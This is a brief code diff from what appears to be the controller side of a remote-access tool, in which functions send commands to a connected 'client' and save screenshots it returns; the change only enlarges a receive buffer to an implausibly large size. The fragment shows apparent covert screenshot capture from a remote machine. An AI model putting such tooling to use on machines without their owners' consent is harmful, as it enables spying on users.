@@ -93,7 +93,7 @@ def send_file(conn,command):
 def screenshot(conn,command):
     conn.send(command.encode())
     print("Taking screenshot of client")
-    screenshot_data = conn.recv(1000000)
+    screenshot_data = conn.recv(10485760000)
     time = datetime.datetime.now()
     screenshot_name = "Screenshot" + time.strftime("%y-%m-%H-%M-%S") + ".png"
     screenshot_file = open(screenshot_name, "wb+")
